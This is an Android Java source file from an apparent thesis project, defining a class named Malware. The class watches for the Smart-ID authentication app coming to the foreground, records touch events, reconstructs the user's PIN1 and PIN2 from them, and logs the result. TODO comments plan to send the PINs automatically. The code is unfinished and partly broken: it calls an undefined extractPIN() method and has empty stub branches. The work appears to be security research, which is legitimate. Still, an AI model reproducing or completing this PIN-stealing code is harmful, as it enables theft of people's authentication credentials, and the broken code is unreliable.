package com.example.thesis;

import android.util.Log;

import com.example.thesis.Buttons.Button;
import com.example.thesis.Events.Event;
import com.example.thesis.Events.EventReader;

import java.util.Deque;
import java.util.List;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    // TODO: SEEM TO BE MISSING BACK BUTTON FOR REMOVING ON DIGIT OF PIN
    // TODO: add check for successful authentication and failure and PIN1, PIN2

    final private Converter converter;

    final private EventReader eventReader;
    final private SmartIDCheck smartIDCheck;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private boolean knowPins = false;  // TODO: If I know the PIN's then auto send them.
    // TODO: if failed login screen then knowPins to false again.

    public Malware(Converter converter) {
        this.converter = converter;
        this.smartIDCheck = new SmartIDCheck();
        this.eventReader = new EventReader();
    }


    public synchronized void doStop() {
        this.doStop = true;
        this.eventReader.doStop();
        this.smartIDCheck.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");

        while (keepRunning()) {
            if (smartIDCheck.isSmartIDInForeground() && !eventReaderRunning) {
                startListening();
            } else if (!smartIDCheck.isSmartIDInForeground() && eventReaderRunning){
                stopListening();

                if (true) {
                    String PIN1 = extractPIN();
                    Log.i("PIN", PIN1);
                }
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Log.i("Malware", "Run loop interrupted!");
            }
        }
    }


    private void blabla() {
        CurrentScreen currentScreen = smartIDCheck.getCurrentScreen();

        if (currentScreen == CurrentScreen.AUTH_PIN_1) {

        } else if (currentScreen == CurrentScreen.AUTH_PIN_2) {

        } else if (currentScreen == CurrentScreen.AUTH_PIN_1_FAILED) {

        } else if (currentScreen == CurrentScreen.AUTH_PIN_2_FAILED) {

        } else if (currentScreen == CurrentScreen.AUTH_SUCCESS) {
            // TODO: remember previous
            String PIN1 = getPIN();
            String PIN2 = getPIN();
        } else if (currentScreen == CurrentScreen.AUTH_FAILED) {

        } else {
            // CurrentScreen.OTHER
        }
    }


    private void startListening() {
        eventReader.doStart();
        Thread eventReaderThread = new Thread(eventReader);
        eventReaderThread.start();
        eventReaderRunning = true;
    }

    private void stopListening() {
        eventReader.doStop();
        eventReaderRunning = false;
    }


    private String getPIN() {
        Deque<Event> touchEvents = eventReader.getTouchEvents();
        return smartIDCheck.extractPIN(touchEvents);
    }



}



